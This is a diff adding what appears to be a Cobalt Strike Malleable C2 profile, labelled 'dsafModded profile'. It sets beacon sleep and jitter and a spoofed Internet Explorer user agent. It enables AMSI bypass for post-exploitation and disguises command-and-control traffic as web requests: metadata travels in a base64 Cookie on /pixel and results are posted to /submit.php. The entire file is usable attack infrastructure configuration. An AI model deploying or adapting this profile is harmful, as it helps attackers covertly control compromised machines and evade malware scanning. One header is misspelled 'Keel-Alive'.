@@ -1,0 +1,69 @@
+#
+#dsafModded profile
+#  
+#
+# 
+#
+
+set sleeptime "30000"; # use a ~30s delay between callbacks
+set jitter    "20";
+set maxdns    "255";
+set useragent "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)";
+
+post-ex {
+    set amsi_disable "true";
+}
+
+http-get {
+
+    set uri "/pixel";
+
+    client {
+        metadata {
+            base64;
+            header "Cookie";    
+        }
+    }
+
+    server {
+
+        header "Connection" "Keep-Alive";
+        header "Cache-Control" "no-cache";
+
+        output {
+            print;
+        }
+    }
+}
+
+http-post {
+
+    set uri "/submit.php";
+
+    client {
+
+        header "Accept" "*/*";
+        header "Accept-Language" "en-en";
+        header "Connection" "Keel-Alive";
+        header "Cache-Control" "no-cache";
+
+        id {
+            parameter"id";
+        }
+
+        output {
+            print;
+        }
+    }
+
+    server {
+
+        header "Content-Type" "application/octet-stream";
+        header "Cache-Control" "no-cache";
+
+        output {
+            base64;
+            print;
+        }
+    }
+}
